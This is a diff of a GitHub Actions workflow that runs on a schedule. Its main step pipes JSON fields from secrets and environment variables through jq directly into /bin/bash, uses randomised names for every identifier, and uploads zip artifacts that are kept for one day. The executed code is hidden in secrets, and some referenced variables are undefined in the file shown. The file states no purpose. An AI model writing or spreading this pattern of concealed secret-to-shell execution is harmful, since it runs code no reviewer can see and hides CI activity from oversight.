@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '40 3,9,15,21 * * *'
+    - cron: '13 1,7,13,19 * * *'
 env:
   CI: true
 jobs:
@@ -15,19 +15,16 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          hu6052: ${{ secrets.hu6052 }}
+          nbwmp32: ${{ secrets.nbwmp32 }}
         run: |
-          printf '%s' "$hu6052" | jq -r .qsilz0 | /bin/bash
-          printf '%s' "$k217" | jq -r .gzu656 | /bin/bash
-          echo $pv077 | jq -r .mvc35 | /bin/bash
-          printf '%s' "$nijj38" | jq -r .sq2910 | /bin/bash
-          printf '%s' "$umoka716" | jq -r .iyrws562 | /bin/bash
-          printf '%s' "$kfamx9" | jq -r .kd257 | /bin/bash
-          echo $e94404 | jq -r .e54 | /bin/bash
+          printf '%s' "$nbwmp32" | jq -r .ruuk82 | /bin/bash
+          printf '%s' "$kqa5891" | jq -r .x1 | /bin/bash
+          printf '%s' "$ck899" | jq -r .plqq50046 | /bin/bash
+          echo $c01 | jq -r .etamm5940 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: vcywnW6o
+          name: ekVQNPCQ
           path: "*.zip"
           retention-days: 1
